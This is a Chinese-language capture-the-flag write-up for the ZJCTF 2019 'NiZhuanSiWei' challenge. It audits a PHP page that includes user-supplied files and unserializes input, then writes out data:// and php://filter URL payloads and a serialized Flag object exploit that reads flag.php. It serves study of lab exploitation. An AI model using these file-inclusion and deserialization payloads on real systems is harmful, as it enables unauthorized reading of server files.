# [ZJCTF 2019]NiZhuanSiWei

## 知识点

`php代码审计`

`php伪协议`

## 解题

```php
<?php
$text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        echo "Not now!";
        exit(); 
    }else{
        include($file);  //useless.php
        $password = unserialize($password);
        echo $password;
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

发现有反序列化函数 但是没有传参点 发现有提示`useless.php`

使用伪协议读取一下内容，注意`include($file)`直接传入`useless.php`会被解析为`php文件`之后被执行，想要读取文件内容则需要使用伪协议

`payload`

```
?text=data://text/plain,welcome to the zjctf&file=php://filter/convert.base64-encode/resource=useless.php
```

读取到`useless.php`文件的内容为

```php
<?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  
```

发现有反序列化的点，并且在源代码时被调用`echo`，所以执行`__toString()`方法

```php
$password = unserialize($password);
echo $password;
```

编写`exp`

因为`file_get_contents`可以直接读取文件，只是读取后会显示在源代码，所以也可以用
```php
public $file = "flag.php";
```

```php
<?php  

class Flag{  //flag.php  
    public $file = "php://filter/convert.base64-encode/resource=flag.php";  
}  

$a = new Flag();
echo serialize($a);
?>  
```

做题的时候忘了`useless.php`还没有包含执行，就在那反序列化了，所以最终`payload`为

```
?text=data://text/plain,welcome to the zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:52:"php://filter/convert.base64-encode/resource=flag.php";}